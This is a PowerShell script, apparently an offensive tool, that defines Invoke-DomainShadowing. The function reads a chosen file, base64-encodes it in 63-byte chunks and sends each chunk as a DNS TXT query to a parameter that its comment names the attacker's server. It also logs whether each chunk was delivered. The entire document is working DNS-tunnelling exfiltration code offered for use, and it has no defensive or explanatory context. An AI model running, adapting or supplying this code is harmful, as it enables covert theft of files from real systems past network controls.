function Invoke-DomainShadowing {
    param (
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$ServerAddress  # Attacker's server IP address
    )

    $ChunkSize = 63  # Hardcoded chunk size

    # Function to split the file content into chunks of equal size
    function Split-FileIntoChunks {
        param (
            [byte[]]$Content,
            [int]$ChunkSize
        )

        $chunks = @()
        $totalChunks = [math]::Ceiling($Content.Length / $ChunkSize)

        for ($i = 0; $i -lt $totalChunks; $i++) {
            $startIndex = $i * $ChunkSize
            $chunk = $Content[$startIndex..([math]::Min($startIndex + $ChunkSize - 1, $Content.Length - 1))]
            $chunks += [PSCustomObject]@{
                Index = $i
                Data = [System.Convert]::ToBase64String($chunk)
            }
        }

        return $chunks
    }

    # Read the file content
    $fileContent = [System.IO.File]::ReadAllBytes($FilePath)

    # Split the content into chunks
    $chunks = Split-FileIntoChunks -Content $fileContent -ChunkSize $ChunkSize

    # Send each chunk as a DNS query and log the results
    foreach ($chunk in $chunks) {
        $query = "$($chunk.Index).$($chunk.Data).example.com"  # Modify as needed to create a valid DNS name format
        try {
            # Using nslookup to send DNS query and redirecting error stream to null
            $nslookupResult = nslookup -type=txt $query $ServerAddress 2>$null
            if ($nslookupResult -match "Non-existent domain|NXDOMAIN") {
                $status = "Failed To Send"
                $colorCode = "`e[31;40m"  # Red text on black background
            } else {
                $status = "Successfully Sent"
                $colorCode = "`e[32;40m"  # Green text on black background
            }
            Write-Output @{"Chunk Status" = "[*] $($colorCode)$status`e[0m"; "Query" = "[*] $($colorCode)$query`e[0m"}
        } catch {
            $status = "Failed To Send"
            $colorCode = "`e[31;40m"  # Red text on black background
            Write-Output @{"Chunk Status" = "[*] $($colorCode)$status`e[0m"; "Query" = "[*] $($colorCode)$query`e[0m"}
        }
    }
}

# Example usage
# Invoke-DomainShadowing -FilePath "C:\path\to\your\file.zip" -ServerAddress "172.21.55.115"
